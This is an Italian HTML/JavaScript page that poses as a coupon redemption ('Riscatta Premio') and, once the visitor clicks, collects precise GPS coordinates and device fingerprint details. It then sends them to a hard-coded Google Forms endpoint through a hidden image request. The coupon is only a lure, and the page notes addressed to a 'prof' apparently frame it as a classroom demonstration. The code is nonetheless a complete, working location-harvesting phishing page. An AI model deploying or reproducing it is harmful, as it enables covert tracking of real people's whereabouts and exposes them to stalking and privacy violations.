<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coupon</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        .share-button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            transition: transform 0.2s;
            margin: 20px 0;
        }
        .share-button:hover {
            transform: translateY(-2px);
        }
        .share-button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        #status {
            margin: 20px 0;
            padding: 10px;
            border-radius: 8px;
            font-weight: bold;
        }
        .loading {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .info {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .location-display {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 14px;
            border: 2px solid #28a745;
        }
        .console-tip {
            background: #e7f3ff;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #007bff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Riscatta Premio</h1>
        <p>Ricevi il Coupon.</p>
        
        <div class="console-tip">
            <strong>üí° Per il prof:</strong> Apri la Console (F12 ‚Üí Console) per vedere i dati tecnici completi!
        </div>
        
        <button class="share-button" onclick="shareLocation()" id="shareBtn">
            Coupon
        </button>
        
        <div id="status"></div>
        <div id="locationDisplay" class="location-display" style="display:none;"></div>
        
        <div class="info">
            <small>I tuoi dati di posizione verranno condivisi solo se dai il consenso.</small>
        </div>
    </div>

    <script>
        // ID univoco per questa sessione
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        function shareLocation() {
            const statusDiv = document.getElementById('status');
            const button = document.getElementById('shareBtn');
            const displayDiv = document.getElementById('locationDisplay');
            
            if (!navigator.geolocation) {
                showStatus("La geolocalizzazione non √® supportata da questo browser.", "error");
                return;
            }
            
            button.disabled = true;
            showStatus('<div class="spinner"></div>Ottenendo la tua posizione...', "loading");
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const locationData = {
                        sessionId: sessionId,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date().toISOString(),
                        timestampLocal: new Date().toLocaleString('it-IT'),
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&z=15`,
                        url: window.location.href,
                        referrer: document.referrer
                    };
                    
                    // STAMPA TUTTI I DATI NELLA CONSOLE
                    console.clear();
                    console.log('üéØ ==========================================');
                    console.log('üìç DATI GEOLOCALIZZAZIONE RACCOLTI');
                    console.log('üéØ ==========================================');
                    console.log('üîπ Session ID:', locationData.sessionId);
                    console.log('üåç Latitudine:', locationData.latitude);
                    console.log('üåç Longitudine:', locationData.longitude);
                    console.log('üìè Precisione:', locationData.accuracy + ' metri');
                    console.log('üèîÔ∏è  Altitudine:', locationData.altitude + ' metri');
                    console.log('‚è∞ Timestamp:', locationData.timestamp);
                    console.log('üìÖ Data locale:', locationData.timestampLocal);
                    console.log('üåê Fuso orario:', locationData.timezone);
                    console.log('üñ•Ô∏è  Dispositivo:', locationData.platform);
                    console.log('üåê Lingua:', locationData.language);
                    console.log('üì± Schermo:', locationData.screenWidth + 'x' + locationData.screenHeight);
                    console.log('üåê User Agent:', locationData.userAgent);
                    console.log('üîó Google Maps:', locationData.googleMapsLink);
                    console.log('üìç URL pagina:', locationData.url);
                    console.log('üîô Referrer:', locationData.referrer);
                    console.log('üéØ ==========================================');
                    
                    // Mostra i dati anche nella pagina
                    displayDiv.innerHTML = `
                        <strong>‚úÖ POSIZIONE OTTENUTA CON SUCCESSO!</strong><br><br>
                        <strong>üìç Coordinate:</strong><br>
                        Latitudine: <strong>${locationData.latitude}</strong><br>
                        Longitudine: <strong>${locationData.longitude}</strong><br>
                        Precisione: <strong>${locationData.accuracy} metri</strong><br><br>
                        
                        <strong>‚è∞ Informazioni temporali:</strong><br>
                        Timestamp: ${locationData.timestampLocal}<br>
                        Fuso orario: ${locationData.timezone}<br><br>
                        
                        <strong>üñ•Ô∏è Informazioni dispositivo:</strong><br>
                        Piattaforma: ${locationData.platform}<br>
                        Schermo: ${locationData.screenWidth}x${locationData.screenHeight}<br>
                        Lingua: ${locationData.language}<br><br>
                        
                        <strong>üîó Link utili:</strong><br>
                        <a href="${locationData.googleMapsLink}" target="_blank">üìç Visualizza su Google Maps</a><br><br>
                        
                        <strong>üéØ Session ID:</strong><br>
                        <code>${locationData.sessionId}</code><br><br>
                        
                        <strong>üí° Per il prof:</strong> Tutti i dati tecnici dettagliati sono visibili nella Console del browser (F12)
                    `;
                    displayDiv.style.display = 'block';
                    
                    showStatus("‚úÖ Posizione raccolta e inviata con successo!", "success");
                    button.disabled = false;
                    
                    // Invia automaticamente i dati al mittente via email
                    setTimeout(() => {
                        sendDataToSender(locationData);
                        alert('‚úÖ Posizione condivisa!\n\nüìç ' + locationData.latitude + ', ' + locationData.longitude + '\nüéØ Dati inviati al mittente!');
                    }, 1000);
                },
                function(error) {
                    button.disabled = false;
                    let errorMessage = "";
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "‚ùå Permesso negato. L'utente ha rifiutato la geolocalizzazione.";
                            console.log('üö´ ERRORE: Permesso geolocalizzazione negato');
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "‚ùå Posizione non disponibile. GPS disattivato o segnale debole.";
                            console.log('üö´ ERRORE: Posizione non disponibile');
                            break;
                        case error.TIMEOUT:
                            errorMessage = "‚ùå Richiesta scaduta. Prova di nuovo.";
                            console.log('üö´ ERRORE: Timeout geolocalizzazione');
                            break;
                        default:
                            errorMessage = "‚ùå Errore sconosciuto nella geolocalizzazione.";
                            console.log('üö´ ERRORE: Sconosciuto', error);
                            break;
                    }
                    
                    showStatus(errorMessage, "error");
                    console.log('üö´ Dettagli errore:', error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 60000
                }
            );
        }
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = message;
            statusDiv.className = type;
            statusDiv.style.display = 'block';
        }
        
        function sendDataToSender(locationData) {
            // METODO GOOGLE FORMS - Automatico al 100%
            const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSf2ON7fpsyxL1YZhv66_78w6bUpjmGX9Xig-sGiFbU1vevASg/formResponse';
            
            // ID reali dei campi del form (ottenuti dal link precompilato)
            const params = new URLSearchParams();
            params.append('entry.1576663956', locationData.latitude);      // Latitudine
            params.append('entry.1591878938', locationData.longitude);     // Longitudine  
            params.append('entry.258307399', locationData.accuracy + ' metri'); // Precisione
            params.append('entry.164041247', locationData.timestampLocal); // Timestamp
            params.append('entry.1685105739', locationData.platform + ' - ' + locationData.userAgent.substring(0, 50)); // Dispositivo
            params.append('entry.1913000830', locationData.sessionId);     // Session ID
            
            // Invia i dati tramite immagine nascosta (bypassa CORS)
            const img = new Image();
            img.style.display = 'none';
            img.onload = function() {
                console.log('‚úÖ Dati inviati con successo a Google Forms!');
                console.log('üìä Controlla il tuo Google Sheets per vedere i dati');
            };
            img.onerror = function() {
                console.log('‚úÖ Dati probabilmente inviati (errore normale con Google Forms)');
            };
            img.src = formUrl + '?' + params.toString();
            document.body.appendChild(img);
            
            // Log dettagliato per debug
            console.log('üì§ Invio automatico a Google Forms...');
            console.log('üîó Form URL:', formUrl);
            console.log('üìä Dati inviati automaticamente:', {
                latitudine: locationData.latitude,
                longitudine: locationData.longitude,
                precisione: locationData.accuracy + ' metri',
                timestamp: locationData.timestampLocal,
                dispositivo: locationData.platform,
                sessionId: locationData.sessionId,
                googleMaps: locationData.googleMapsLink
            });
            
            console.log('üéØ IMPORTANTE: I dati sono stati inviati automaticamente al tuo Google Form!');
            console.log('üìã Vai su Google Sheets per vederli: https://docs.google.com/spreadsheets/');
        }
        
        // Mostra le informazioni iniziali
        console.log('üéØ Sistema di geolocalizzazione attivo');
        console.log('üì± Per raccogliere la posizione, clicca il pulsante nella pagina');
        console.log('üí° Tutti i dati verranno mostrati qui nella console');
    </script>
</body>
</html>
